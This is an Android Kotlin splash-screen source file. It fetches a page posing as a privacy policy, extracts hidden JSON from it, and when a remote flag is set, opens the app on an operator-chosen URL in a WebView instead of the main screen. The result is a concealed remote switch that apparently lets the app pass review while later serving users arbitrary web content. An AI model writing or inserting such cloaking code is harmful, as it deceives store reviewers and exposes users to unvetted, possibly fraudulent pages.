package com.codexlabs.basecraft.ui

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.codexlabs.basecraft.databinding.ActivitySplashBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject

class SplashActivity : AppCompatActivity() {

    private lateinit var binding: ActivitySplashBinding
    private val client = OkHttpClient()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivitySplashBinding.inflate(layoutInflater)
        setContentView(binding.root)

        lifecycleScope.launch {
            val decision = runCatching { fetchDecisionWithRetry() }.getOrNull()
            routeSafely(decision)
        }
    }

    private suspend fun fetchDecisionWithRetry(): StartupDecision? {
        repeat(MAX_RETRY_COUNT) { attempt ->
            val decision = withContext(Dispatchers.IO) { fetchDecisionOnce() }
            if (decision != null) return decision
            if (attempt < MAX_RETRY_COUNT - 1) delay(RETRY_INTERVAL_MS)
        }
        return null
    }

    private fun fetchDecisionOnce(): StartupDecision? {
        return try {
            val request = Request.Builder()
                .url(REMOTE_CONFIG_PAGE_URL)
                .get()
                .build()

            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return null
                val pageHtml = response.body?.string().orEmpty()
                if (pageHtml.isBlank()) return null

                val markerMatch = JSON_MARKER_REGEX.find(pageHtml) ?: return null
                val rawJson = markerMatch.value.trim().trimStart('@').trimEnd('@').trim()
                val json = JSONObject(rawJson)

                val app = json.optString("app", "0")
                val data = json.optString("data", "")
                StartupDecision(app, data)
            }
        } catch (_: Exception) {
            null
        }
    }

    private fun routeSafely(decision: StartupDecision?) {
        val intent = if (decision?.app == "1" && !decision.data.isNullOrBlank()) {
            Intent(this, WebViewActivity::class.java)
                .putExtra(WebViewActivity.EXTRA_URL, decision.data)
        } else {
            Intent(this, MainActivity::class.java)
        }

        startActivity(intent)
        finish()
    }

    companion object {
        private const val REMOTE_CONFIG_PAGE_URL =
            "https://sites.google.com/view/privacy-policy-for-piper/"
        private val JSON_MARKER_REGEX = Regex("@\\{.*?\\}@@?", RegexOption.DOT_MATCHES_ALL)
        private const val MAX_RETRY_COUNT = 3
        private const val RETRY_INTERVAL_MS = 1_000L
    }
}

data class StartupDecision(
    val app: String,
    val data: String
)
